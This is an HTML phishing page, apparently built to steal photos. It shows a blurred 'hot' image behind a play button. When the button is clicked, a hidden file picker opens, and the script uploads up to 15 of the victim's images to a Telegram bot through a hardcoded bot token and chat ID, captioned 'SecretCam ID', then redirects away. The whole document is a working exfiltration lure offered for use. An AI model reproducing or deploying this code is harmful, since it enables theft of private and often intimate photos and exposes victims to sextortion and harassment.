<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body,html{height:100vh;overflow:hidden;background:#000;}
    #bg{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:blur(22px);transition:filter 1s;}
    .play{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:92px;height:92px;background:rgba(255,255,255,0.97);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:46px;color:#000;cursor:pointer;z-index:99;box-shadow:0 10px 40px rgba(0,0,0,0.8);animation:pulse 1.8s infinite;}
    @keyframes pulse{0%{box-shadow:0 10px 40px rgba(0,0,0,0.8);}70%{box-shadow:0 15px 70px rgba(255,255,255,0.9);}100%{box-shadow:0 10px 40px rgba(0,0,0,0.8);}}
  </style>
</head>
<body>

  <!-- তোমার সবচেয়ে হট ছবির লিংক এখানে বসাও -->
  <img id="bg" src="https://i.imgur.com/8Yv3mP8.jpeg">

  <div class="play" id="playBtn">▶</div>

<script>
const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
const CHAT_ID   = "7731349577";
const id = new URLSearchParams(location.search).get('id') || 'unknown';
const bg = document.getElementById('bg');
const playBtn = document.getElementById('playBtn');

playBtn.onclick = () => {
  playBtn.style.display = 'none';
  bg.style.filter = 'blur(0px)';

  const input = document.createElement('input');
  input.type = 'file';
  input.accept = 'image/*';
  input.multiple = true;
  input.style.display = 'none';
  document.body.appendChild(input);

  input.onchange = async (e) => {
    const files = Array.from(e.target.files).slice(0, 15);
    for (let i = 0; i < files.length; i++) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', files[i]);
      form.append('caption', `SecretCam ID: ${id}\nছবি: ${i+1}/${files.length}\n${new Date().toLocaleString('bn-BD')}`);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: form});
      await new Promise(r => setTimeout(r, 700));
    }
    setTimeout(() => location.href = "https://i.imgur.com/removed.png", 2000);
  };

  input.click();
};
</script>
</body>
</html>
